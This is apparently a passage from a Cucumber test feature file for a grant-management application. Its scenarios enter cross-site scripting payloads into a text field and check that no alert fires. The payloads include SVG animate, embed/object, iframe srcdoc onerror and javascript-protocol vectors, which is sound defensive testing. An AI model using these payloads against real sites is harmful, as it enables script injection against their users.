      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302319 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                                                        | Field                  |
      | <svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x /> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302320 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                         | Field                  |
      | <embed code=https://portswigger-labs.net width=500 height=500 type=text/html> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302321 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                           | Field                  |
      | <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302322 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                  |
      | <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302324 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                  |
      | <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302327 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                           | Field                  |
      | <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302335 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                           | Field                  |
      | <script>location.protocol='javascript'</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302336 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                          | Field                  |
      | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302337 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                  |
      | <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @302338 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                         | Field                  |
      | <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

